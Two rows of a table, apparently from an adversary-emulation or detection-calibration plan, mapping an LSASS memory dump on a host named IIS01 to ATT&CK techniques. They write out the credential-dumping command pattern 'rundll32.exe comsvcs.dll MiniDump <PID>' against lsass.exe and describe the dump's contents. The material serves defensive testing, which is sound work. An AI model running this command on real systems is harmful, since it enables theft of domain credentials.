| rundll32.exe comsvcs.dll MiniDump LSASS process dump proxy execution | Defense Evasion | T1218.011 | System Binary Proxy Execution: Rundll32 | Windows | `rundll32.exe` executes with command line `comsvcs.dll MiniDump <PID>` where `<PID>` resolves to `lsass.exe` on IIS01 | Calibrated - Not Benign | - | `rundll32.exe` proxies `comsvcs.dll`'s `MiniDump` export to write a full LSASS minidump to `C:\Windows\Temp\g.dmp` — alternative to the `RtlCreateProcessReflection`-based Step 3; tests the `comsvcs.dll MiniDump` detection chain used by Conti, BlackBasta, and BlackSuit | IIS01 (10.12.10.20) | NT AUTHORITY\SYSTEM | - | - |
| comsvcs.dll MiniDump LSASS memory credential dump to g.dmp | Credential Access | T1003.001 | OS Credential Dumping: LSASS Memory | Windows | `rundll32.exe` opens a `PROCESS_ALL_ACCESS` handle to `lsass.exe` and writes a minidump file (MDMP header) to `C:\Windows\Temp` on IIS01 | Calibrated - Not Benign | - | `comsvcs.dll MiniDump` dumps full LSASS working set to `g.dmp` via `rundll32.exe` — distinct from Step 3's XOR-encrypted `f.elif`; dump contains plaintext credentials, NTLM hashes, and Kerberos tickets for domain accounts cached on IIS01 | IIS01 (10.12.10.20) | NT AUTHORITY\SYSTEM | - | - |

---